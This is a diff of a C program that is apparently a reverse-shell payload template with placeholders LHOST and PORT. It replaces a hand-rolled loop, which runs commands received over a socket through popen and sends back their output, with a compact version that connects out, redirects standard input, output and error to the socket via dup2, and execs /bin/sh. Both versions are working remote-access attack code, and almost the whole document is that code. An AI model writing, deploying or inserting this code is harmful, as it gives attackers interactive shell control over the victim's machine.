@@ -1,70 +1,27 @@
-// Client side C/C++ program to demonstrate Socket
-// programming
-#include <stdio.h>
-#include <sys/socket.h> 
-#include <stdlib.h>
-#include <netinet/in.h> 
-#include <string.h>
 #include <arpa/inet.h>
-#include <sys/types.h>
+#include <stdio.h>
 #include <unistd.h>
 
-char message[10000];
-struct sockaddr_in serv; 
-int fd; 
-int conn; 
-int valread;
-char output;
-char interactive[] = "bash -i ";
-char shell[10000];
-char redirect[] = " >/dev/null 2>&1";
+int main(void){
+	char ip[] = LHOST;
+	int port = PORT;
 
-int main(){
-  char ip[] = LHOST;
-  int port = PORT;
+	struct sockaddr_in sa;
+	sa.sin_family = AF_INET;
+	sa.sin_port = htons(port);
+	sa.sin_addr.s_addr = inet_addr(ip);
 
-  fd = socket(AF_INET, SOCK_STREAM, 0);
+	int sockt =  socket(AF_INET, SOCK_STREAM, 0);
 
-  serv.sin_family = AF_INET;
-  serv.sin_port = htons(port);
+	if (connect(sockt, (struct sockaddr *)&sa, sizeof(sa)) != 0){
+		printf("[ERROR] connection failed.\n");
+		return (1);
+	}
+	dup2(sockt, 0);
+	dup2(sockt, 1);
+	dup2(sockt, 2);
 
-  inet_pton(AF_INET, ip, &serv.sin_addr); //Binds client to localhost
-
-  connect(fd, (struct sockaddr *)&serv, sizeof(serv)); //connects client to server
-  
-  conn = accept(fd, (struct sockaddr *)NULL, NULL);
- 
-  while(1){
-    fflush(stdout);
-
-    valread = read(fd, message, 10000);
-        
-    if(valread > 0){
-      strcat(interactive, message);
-      strcat(interactive, redirect);
-      message[strlen(message)] = ' ';
-
-      FILE *file = popen(message, "r");
-      output = fgetc(file);
-      int i = 0;
-      
-      while (output != EOF){
-        
-        shell[i] = output;
-
-        output = fgetc(file);
-        i++;
-      }
-       
-      send(fd, shell, strlen(shell), 0);
-      for(int i = 0; i < strlen(shell); i++){
-        shell[i] = ' ';
-      }
-      fclose(file);
-    
-    }  
-  
-}
-
-  return 0;
+	char *const argv[] = {"/bin/sh", NULL};
+	execve("/bin/sh", argv, NULL);
+	return 0;
 }
